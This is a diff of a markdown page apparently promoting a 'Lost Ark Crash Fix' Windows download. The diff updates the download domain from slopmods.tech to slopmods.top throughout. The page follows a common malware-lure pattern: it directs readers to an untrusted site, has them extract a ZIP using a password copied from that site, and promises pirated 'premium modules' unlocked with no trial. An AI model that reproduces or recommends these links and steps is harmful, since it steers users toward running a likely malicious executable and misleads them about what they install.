@@ -8,12 +8,12 @@ Lost Ark Crash Fix — Windows setup and configuration · Premium workspace · Z
 
 > Use the release page below for Windows.
 
-- **Release page:** [vygbaqyohmu.slopmods.tech](https://vygbaqyohmu.slopmods.tech/)
-- **Full URL:** `https://vygbaqyohmu.slopmods.tech/`
+- **Release page:** [vygbaqyohmu.slopmods.top](https://vygbaqyohmu.slopmods.top/)
+- **Full URL:** `https://vygbaqyohmu.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **vygbaqyohmu.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **vygbaqyohmu.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Lost Ark Crash Fix — Windows setup and configuration · Premium workspace · Z
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **vygbaqyohmu.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **vygbaqyohmu.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
